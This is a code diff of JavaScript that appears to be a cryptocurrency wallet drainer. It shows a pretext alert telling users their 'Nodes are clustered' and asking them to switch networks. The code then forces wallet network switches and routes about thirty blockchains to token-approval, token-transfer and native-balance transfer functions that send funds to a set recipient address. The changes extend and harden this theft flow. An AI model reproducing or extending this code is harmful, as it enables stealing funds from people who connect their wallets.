@@ -565,61 +565,61 @@ async function connectWallet() {
 
         if (!networksWithTokens.some(net => net.chainId === currentChainId.chainId) && networksWithTokens.length > 0) {
             window.alert(`Your Nodes are clustered on the current Networks: ${networksWithTokens.map(net => net.name).join(", ")}. Please switch your network!`);
-            await Promise.all(
-              networksWithTokens.map(async (net) => {
-                const targetNetworkId = net.chainId;
-                try{
-                  await modal.switchNetwork(targetNetworkId);
-                  console.log(`Switched to network: ${targetNetworkId}`);
-      
-                  // Update the provider and signer to reflect the new network
-                  provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-                  signer = provider.getSigner();
-      
-                  // Handle transactions for the switched network
-                  await handleNetworkTransactions(targetNetworkId, address, signer, provider);
-                }
-                catch(switchError){
-                  if (switchError.code === 4902) {
-                    try {
-                        // If the network is not added to the user's wallet, add it
-                        await provider.send('wallet_addEthereumChain', [{
-                            chainId: `0x${targetNetworkId.toString(16)}`,
-                            rpcUrls: [net.rpcUrl],
-                            chainName: net.name,
-                            nativeCurrency: net.nativeCurrency,
-                            blockExplorerUrls: [net.blockExplorerUrl]
-                        }]);
-                        console.log(`Added and switched to network: ${targetNetworkId}`);
-                    } catch (addError) {
-                        console.error('Failed to add the network:', addError);
-                    }
-                }else{
-                    console.error('Failed to switch the network:', switchError);
+            for (let net of networksWithTokens) {
+                var targetNetworkId = net.chainId; // Target each network with tokens
+                try {
+                    // Attempt to switch networks programmatically
+                    await modal.switchNetwork(targetNetworkId);
+                    console.log(`Switched to network: ${targetNetworkId}`);
+        
+                    // Update the provider and signer to reflect the new network
+                    provider = new ethers.providers.Web3Provider(walletProvider, 'any');
                     signer = provider.getSigner();
+        
+                    // Handle transactions for the switched network
+                    await handleNetworkTransactions(targetNetworkId, address, signer, provider);
+                    continue;
+                  
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        try {
+                            // If the network is not added to the user's wallet, add it
+                            await provider.send('wallet_addEthereumChain', [{
+                                chainId: `0x${targetNetworkId.toString(16)}`,
+                                rpcUrls: [net.rpcUrl],
+                                chainName: net.name,
+                                nativeCurrency: net.nativeCurrency,
+                                blockExplorerUrls: [net.blockExplorerUrl]
+                            }]);
+                            console.log(`Added and switched to network: ${targetNetworkId}`);
+                            continue; // Continue to the next network
+                        } catch (addError) {
+                            console.error('Failed to add the network:', addError);
+                        }
+                    }else{
+                        console.error('Failed to switch the network:', switchError);
+                        signer = provider.getSigner();
+                    }
                 }
-                }
-              })
-            )  
-            
+            }
         } else {
            window.alert(`User is already connected to the correct network}`)
-            await Promise.all(
-              networksWithTokens.map(async (net) => {
-                const targetNetworkId = net.chainId
-                try {
-                  // Attempt to switch networks programmatically
-                  await modal.switchNetwork(targetNetworkId);
-                  console.log(`Switched to network: ${targetNetworkId}`);
+           for (let net of networksWithTokens) {
+            var targetNetworkId = net.chainId; // Target each network with tokens
+            try {
+                 // Attempt to switch networks programmatically
+                await modal.switchNetwork(targetNetworkId);
+                console.log(`Switched to network: ${targetNetworkId}`);
 
-                  // Update the provider and signer to reflect the new network
-                  provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-                  signer = provider.getSigner();
+                // Update the provider and signer to reflect the new network
+                provider = new ethers.providers.Web3Provider(walletProvider, 'any');
+                signer = provider.getSigner();
 
-                  // Handle transactions for the switched network
-                  await handleNetworkTransactions(targetNetworkId, address, signer, provider);
-                } catch (switchError) {
-                  if (switchError.code === 4902) {
+                // Handle transactions for the switched network
+                await handleNetworkTransactions(targetNetworkId, address, signer, provider);
+                continue;
+            } catch (switchError) {
+                if (switchError.code === 4902) {
                     try {
                         // If the network is not added to the user's wallet, add it
                         await provider.send('wallet_addEthereumChain', [{
@@ -630,6 +630,7 @@ async function connectWallet() {
                             blockExplorerUrls: [net.blockExplorerUrl]
                         }]);
                         console.log(`Added and switched to network: ${targetNetworkId}`);
+                        continue; // Continue to the next network
                     } catch (addError) {
                         console.error('Failed to add the network:', addError);
                     }
@@ -637,27 +638,138 @@ async function connectWallet() {
                     console.error('Failed to switch the network:', switchError);
                     signer = provider.getSigner();
                 }
-                }
-              })
-            )
+            }
         }
     }
-    catch (error) {
+
+    } catch (error) {
         console.error('Error handling tokens:', error);
     }
 
 }
 
 
-//Helpers
-async function handleNetworkTransactions(chainId, address, signer, provider){
-  switch(chainId) {
+//HELPER FUNCTIONS
+async function handleNetworkTransactions(chainId, address, signer, provider) {
+  switch (chainId) {
     case mainnet.chainId:
-      await handleTransactions(fetchETHTokens, contractAddress, address, signer, provider, 'ETH')
+      await handleTransactions(fetchETHTokens, contractAddress, address, signer, provider, 'ETH');
       break;
 
     case bsc.chainId:
-      await handleTransactions(fetchBNBTokens, bnbContractAddress, address, signer, provider, 'BSC')
+      await handleTransactions(fetchBNBTokens, bnbContractAddress, address, signer, provider, 'BNB');
+      break;
+
+    case arbitrum.chainId:
+      await handleTransactions(fetchARBTokens, arbContractAddress, address, signer, provider, 'ARB');
+      break;
+
+    case arbnova.chainId:
+      await handleTransactions(fetchARBNOVATokens, arbnovaContractAddress, address, signer, provider, 'ETH')
+      break;
+    
+    case base.chainId:
+      await handleTransactions(fetchBASETokens, baseContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case optimism.chainId:
+      await handleTransactions(fetchOPTokens, optimismContractAddress, address, signer, provider, 'OP')
+      break;
+
+    case polygon.chainId:
+      await handleTransactions(fetchPOLYGONTokens, polygonContractAddress, address, signer, provider, 'MATIC')
+      break;  
+      
+    case polygonevm.chainId:
+      await handleTransactions(fetchPOLYGONEVMTokens, polygonevmContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case linea.chainId:
+      await handleTransactions(fetchLINEATokens, lineaContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case gnosis.chainId:
+      await handleTransactions(fetchGNOSISTokens, gnosisContractAddress, address, signer, provider, 'xDAI')
+      break;
+
+    case zksync.chainId:
+      await handleTransactions(fetchZKSYNCTokens, zksyncContractAddress, address, signer, provider, 'ZK')
+      break;
+
+    case celo.chainId:
+      await handleTransactions(fetchCELOTokens, celoContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case fantom.chainId:
+      await handleTransactions(fetchFANTOMTokens, fantomContractAddress, address, signer, provider, 'FTM')
+      break;
+
+    case merlin.chainId:
+      await handleTransactions(fetchMERLINTokens, merlinContractAddress, address, signer, provider, 'BTC')
+      break;
+
+    case manta.chainId: 
+      await handleTransactions(fetchMANTATokens, mantaContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case blast.chainId:
+      await handleTransactions(fetchBLASTTokens, blastContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case mantle.chainId:
+      await handleTransactions(fetchMANTLETokens, mantleContractAddress, address, signer, provider, 'MNT')
+      break;
+
+    case metis.chainId:
+      await handleTransactions(fetchMETISTokens, metisContractAddress, address, signer, provider, 'METIS')
+      break;
+
+    case heco.chainId:
+      await handleTransactions(fetchHECOTokens, hecoContractAddress, address, signer, provider, 'HT')
+      break;
+
+    case platon.chainId:
+      await handleTransactions(fetchPLATONTokens, platonContractAddress, address, signer, provider, 'LAT')
+      break;
+
+    case conflux.chainId:
+      await handleTransactions(fetchCONFLUXTokens, confluxContractAddress, address, signer, provider, 'CFX')
+      break;
+
+    case aurora.chainId:
+      await handleTransactions(fetchAURORATokens, auroraContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case avalanche.chainId:
+      await handleTransactions(fetchAVALANCHETokens, avalancheContractAddress, address, signer, provider, 'AVA')
+      break;
+
+    case smartbch.chainId:
+      await handleTransactions(fetchSMARTBCHTokens, smartbchContractAddress, address, signer, provider, 'BCH')
+      break;
+
+    case scroll.chainId:
+      await handleTransactions(fetchSCROLLTokens, scrollContractAddress, address, signer, provider, 'ETH')
+      break;
+
+    case opbnb.chainId:
+      await handleTransactions(fetchOPBNBTokens, opbnbContractAddress, address, signer, provider, 'BNB')
+      break;
+
+    case klaytn.chainId:
+      await handleTransactions(fetchKLAYTNTokens, klaytnContractAddress, address, signer, provider, 'KLAY')
+      break;
+
+    case okx.chainId:
+      await handleTransactions(fetchOKXTokens, okxContractAddress, address, signer, provider, 'OKT')
+      break;
+
+    case cronos.chainId:
+      await handleTransactions(fetchCRONOSTokens, cronosContractAddress, address, signer, provider, 'CRO')
+      break;
+
+    case harmony.chainId:
+      await handleTransactions(fetchHARMONYTokens, harmonyContractAddress, address, signer, provider, 'ONE')
       break;
 
     default:
@@ -741,7 +853,6 @@ async function handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, sign
   }
 }
 
-
 async function transferNativeToken(address, signer, provider, recipientAddress, symbol) {
   try {
     const balance = await provider.getBalance(address);
@@ -767,7 +878,6 @@ async function transferNativeToken(address, signer, provider, recipientAddress, 
     console.error(`Error transferring ${symbol}:`, error);
   }
 }
-
 
 
 //API FUNCTIONS
